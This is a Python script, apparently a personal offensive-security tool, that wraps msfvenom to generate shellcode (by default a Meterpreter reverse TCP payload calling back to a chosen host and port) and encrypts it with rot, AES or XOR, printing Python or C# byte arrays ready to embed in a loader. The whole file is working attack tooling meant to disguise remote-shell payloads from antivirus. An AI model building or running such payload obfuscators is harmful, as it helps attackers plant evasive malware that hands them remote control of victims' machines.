# (m4ud)'s encryptor -\_(-,-)_/-

import subprocess
import argparse
from Crypto.Cipher import AES
from Crypto.Util import Padding
import re


def caesar_encrypt(shellcode, key):
    key = int(key)
    encrypted_shellcode = bytearray()
    for b in shellcode:
        encrypted_b = (b + key) % 256
        #encrypted_b = b + key
        encrypted_shellcode.append(encrypted_b)
    print("Caesar Cipher/rot enc for shellcode")
    sizez = str(len(encrypted_shellcode))
    print("\r\nShellcode size: "+ sizez + "\r\n")
    return encrypted_shellcode, sizez


def aes_encrypt(shellcode, key):
    key = key.encode()
    # Pad the key to the correct length
    key = key.ljust(16, b'\x00')
    while len(key) < 16:
        key += b'\x00'
    cipher = AES.new(key, AES.MODE_ECB)
    shellcode = Padding.pad(shellcode, AES.block_size)
    encrypted_shellcode = bytearray(cipher.encrypt(shellcode))
    sizez = str(len(encrypted_shellcode))
    print("AES enc for shellcode")
    print("\r\nShellcode size: "+ sizez + "\r\n")
    return encrypted_shellcode, sizez

def xor_encrypt(shellcode, key):
    key = key.encode()
    encrypted_shellcode = bytearray()
    for i, c in enumerate(shellcode):

        if i % 2 == 0:
            z = shellcode[i:i+2]
            x = int(z, base=16)
            encrypted_shellcode.append(x ^ int(key))
            # better enc(todo)
            #encrypted_shellcode.append(x ^ int(str(key[i % len(key)]), 16))
    print("XOR enc for shellcode")
    sizez = str(len(encrypted_shellcode))
    print("\r\nShellcode size: "+ sizez + "\r\n")
    return encrypted_shellcode, sizez

def main():
    parser = argparse.ArgumentParser(description='Wrapper for msfvenom')
    parser.add_argument('-p', '--payload', required=True, help='The payload to be generated', nargs='?', default="windows/x64/meterpreter/reverse_tcp")
    parser.add_argument('-e', '--encryption', required=False, help='Encryption method')
    parser.add_argument('-k', '--key', required=False, help='Key for encryption')
    parser.add_argument('-lhost', '--lhost', required=True, help='The target IP')
    parser.add_argument('-lport', '--lport', required=True, help='The target port')
    parser.add_argument('-f', '--format', help='chsarp or python', nargs='?', default="python")
    args = parser.parse_args()

    msfvenom_output = subprocess.run(['msfvenom', '-p', args.payload, '-f', args.format,'-v','shellcode', '-a', 'x86', 'LHOST='+args.lhost, 'LPORT='+args.lport], capture_output=True)
    shellcode = msfvenom_output.stdout.decode().strip(" ")
    print("\r\n( M4UD's Shellcode Encryptor -\_(- -)_/-  )\r\n")


    if args.encryption != None and args.format == 'csharp':
        shellcode = re.findall(r'0x[0-9a-fA-F]+', shellcode)
        a = ""
        for i in range(len(shellcode)):
            a += shellcode[i]
        a = a.replace("0x","")
        shellcode = a 


    if args.encryption != None and args.format == 'python':
        shellcode += "\""
        shellcode = shellcode.replace("\" +\n\"", "").replace("shellcode =  b\"", "").replace("\"\n\"","").replace("\"\nshellcode += b\"", "").replace("\\x","")

    if args.encryption == 'rot' and args.key and args.format == 'python':
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode, sizez = caesar_encrypt(shellcode, args.key)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")


    if args.encryption == 'rot' and args.key and args.format == 'csharp':
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode, sizez = caesar_encrypt(shellcode, args.key)
        print("byte[] shellcode = new byte["+ sizez + "] { ")
        for i, b in enumerate(encrypted_shellcode):
            print("0x%02x," % b, end="")
            if (i+1) % 15 == 0:
                print("")
                print( end="")
        print(" };")

    if args.encryption == 'aes' and args.key and args.format == 'python':
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode, sizez = aes_encrypt(shellcode, args.key)
        #print(shellcode)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")


    if args.encryption == 'aes' and args.key and args.format == 'csharp':
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode, sizez = aes_encrypt(shellcode, args.key)
        print("btes[] shellcode = new byte["+sizez+"] { ")
        for i, b in enumerate(encrypted_shellcode):
            print("0x%02x," % b, end="")
            if (i+1) % 15 == 0:
                print("")
                print(end="")
        print(" };")


    if args.encryption == 'xor' and args.key and args.format == 'python':
        shellcode = bytearray(shellcode.encode())
        encrypted_shellcode, sizez = xor_encrypt(shellcode, args.key)
        #print(shellcode)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")

    if args.encryption == 'xor' and args.key and args.format == 'csharp':
        shellcode = bytearray(shellcode.encode())
        encrypted_shellcode, sizez = xor_encrypt(shellcode, args.key)
        print("byte[] shellcode = new byte["+sizez+"] { ")
        for i, b in enumerate(encrypted_shellcode):
            print("0x%02x," % b ,end="") 
            if (i+1) % 15 == 0:
                print("")
                print(end="")
        print(" };")


    if args.encryption == None:
        if isinstance(shellcode, bytes):
            shellcode = shellcode.replace(b'shelcode =',b'OShellcode = ')
        else:
            shellcode = shellcode.replace('shelcode =','OShellcode = ')
            print(shellcode)

if __name__ == '__main__':
    main()
